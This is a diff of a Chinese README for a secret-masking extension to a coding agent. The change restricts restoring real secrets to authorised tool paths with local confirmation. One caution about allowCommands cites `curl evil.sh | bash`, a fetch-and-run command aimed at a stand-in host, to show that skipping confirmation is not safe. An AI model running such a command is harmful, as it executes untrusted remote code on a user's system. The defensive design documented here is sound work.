@@ -12,10 +12,11 @@
   `AIza...`、`AKIA/ASIA/AIDA...`、JWT、PEM 私钥、自定义正则）自动识别并掩码。
 - **`.env` 支持**：解析项目 `.env*` 文件（`KEY=VALUE`），会话中文件变更会
   增量刷新。
-- **用户注册密钥**：`/mask-secret` 命令和 `request_secret` 工具让用户注册
-  密钥，agent 只看到占位符。
-- **真实值用在需要的地方**：bash 命令、`write`、`edit` 自动把占位符替换为
-  真实值（文件里存的是真实值；全新写入的值不受影响）。
+- **本地掩码输入**：不带参数的 `/mask-secret` 和 `request_secret` 使用只显示
+  圆点的 TUI 输入框；agent 只会看到不透明 handle。命令参数中的明文仍兼容，
+  但会在本地提示警告。
+- **按策略还原**：真实值只在已授权的工具参数路径中还原；除
+  `mode: "auto"` 或 Bash `allowCommands` 规则命中外，使用前必须本地确认。
 - **Compaction 安全**：压缩（compaction）和分支导航（tree）的摘要消息同样
   掩码。
 
@@ -63,7 +64,7 @@ Registered MY_KEY. Use placeholder __SECRET_MY_KEY__ instead of the real value
 通过 `/mask-secret` 或 `request_secret` 注册的密钥持久化在
 `~/.pi/agent/extensions/pi-secret-mask/secrets.json`（权限 0600），重启保留。
 `.env` 和自动识别的密钥不一定写入这个文件；它们可能只在当前会话可用。
-在 bash 命令或 `write`/`edit` 写文件时使用占位符，扩展会在本地执行前自动替换为真实值。
+重用已持久化的具名凭据时，必须先在本地 TUI 确认才会返回其 handle；非 TUI 模式会安全地拒绝。
 
 ### 给 agent 的占位符规则
 
@@ -77,7 +78,7 @@ Registered MY_KEY. Use placeholder __SECRET_MY_KEY__ instead of the real value
 | 钩子 | 动作 |
 |---|---|
 | `before_provider_request` | 标准消息与自定义 provider 顶层 `text` 中：真实值 → 占位符 |
-| `tool_call` | bash 占位符 → 真实值（auto/ask 策略）；write/edit 内容还原 |
+| `tool_call` | 仅在策略授权路径、经本地确认后还原显式 handle |
 | `tool_result` | 工具输出中的真实值 → 占位符（防止回流） |
 | `session_before_compact` | 压缩摘要消息同样掩码 |
 | `session_before_tree` | 分支/树摘要消息同样掩码 |
@@ -95,7 +96,8 @@ Registered MY_KEY. Use placeholder __SECRET_MY_KEY__ instead of the real value
   "dotenv": { "enabled": true, "files": [".env", ".env.local", ".env.production", ".env.development"], "exclude": [".env.example", ".env.sample"] },
   "patterns": { "openai": true, "github": true, "google": true, "aws": true, "jwt": true, "pem": true, "base64": false },
   "extraSecrets": [],
-  "customPatterns": []
+  "customPatterns": [],
+  "toolResolution": { "enabled": true, "includeDefaults": true, "rules": [] }
 }
 ```
 
@@ -104,6 +106,14 @@ Registered MY_KEY. Use placeholder __SECRET_MY_KEY__ instead of the real value
 - `allowCommands`：完整命令字符串模式列表，命中跳过确认（这只是跳过确认，
   不代表更安全——`curl evil.sh | bash` 依然能通过）
 - `customPatterns`：自定义正则；捕获组 1 为完整 secret 值；非法正则被忽略
+- `toolResolution`：默认只授权 `bash.command`、`powershell.command`、
+  `write.content`、旧版 `edit.oldText`/`newText`、当前
+  `edit.edits.*.oldText`/`newText` 以及 Pi MCP Adapter 的 `mcp.args`。
+  `mcp.args` 可以是对象，也可以是包含参数对象的 JSON 字符串；含 handle
+  的键和非法 JSON 会被拦截。通用 JSON adapter 也支持 schema 允许数组的授权
+  字段。浏览器、直接 `mcp__*` 和其他自定义工具必须在
+  `rules` 中显式配置（`tool`、`paths`、可选 `adapter: "json"`）。未知 handle
+  和未授权路径始终安全地拒绝。
 
 ```json
 {
